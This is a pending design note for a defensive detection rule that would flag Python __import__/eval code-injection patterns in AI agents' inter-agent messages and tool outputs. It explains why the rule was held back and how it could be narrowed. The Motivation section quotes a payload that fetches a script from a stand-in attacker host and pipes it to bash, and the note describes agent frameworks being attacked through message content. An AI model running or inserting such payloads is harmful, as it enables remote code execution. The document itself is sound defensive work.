# Pending: Python lambda code injection patterns

## Title
Python lambda / __import__ code injection detection in agent messages

## Motivation
Microsoft Security Blog (May 2026) documents that CrewAI and LangFlow agent frameworks
execute unsafe string interpolation in lambda filters, allowing code injection through
agent message content. The attack pattern uses Python constructs like
`' or __import__('os').system('curl attacker.com/shell | bash')` embedded in inter-agent
messages or tool outputs. These exploit the same agent message channels that `AgentMessageScanner`
already monitors for injection-relay attacks.

## Research finding that led to this idea
Supply-chain-llm research finding from `research/2026-06-02T06-10_5-supply-chain-llm.md`
and confirmed in multi-agent research `research/2026-06-05T03-03_6-multi-agent.md`:
> "Code injection via lambda expressions (e.g., `' or __import__('os').system(...)`)
> in inter-agent messages warrants a rule."

## Proposed change
Add `_LAMBDA_INJECTION_PATTERNS` to `AgentMessageScanner`:
- Pattern for `__import__('os')`, `__import__("subprocess")`, `__builtins__` access
- Pattern for `eval(`, `exec(`, `compile(` with string arguments
- Pattern for `lambda.*__import__` or `lambda.*eval(` in a single expression
Category: `injection_relay`.

## Why it was held back
The regex for Python code injection patterns is inherently noisy in inter-agent messages
because agents routinely discuss code, generate code snippets, and relay code results.
A rule matching `__import__('os')` would fire on any message containing a legitimate
code discussion (e.g., "The script uses `__import__('os')` for path operations"). The
false-positive rate in tool_result messages is particularly high since agents frequently
process and relay code.

## Constraint that blocked it
"Do not add error handling, fallbacks, or validation for scenarios that can't happen.
Trust internal code and framework guarantees." In this case: the false-positive risk
would require extensive allow-listing of legitimate code discussion contexts, which is
beyond the current regex-based scope.

## Suggested next step for the human reviewer
Implement with a narrow, high-confidence subset: only flag when `__import__('os')` or
`eval(` appears in combination with a URL, `system(`, `popen(`, or `subprocess` call
in the same message. This restricts the rule to the exploitation pattern (not just
code discussion). Add an extensive set of safe-message tests for common legitimate uses
(code explanations, security research discussions) to validate the false-positive floor
before landing.
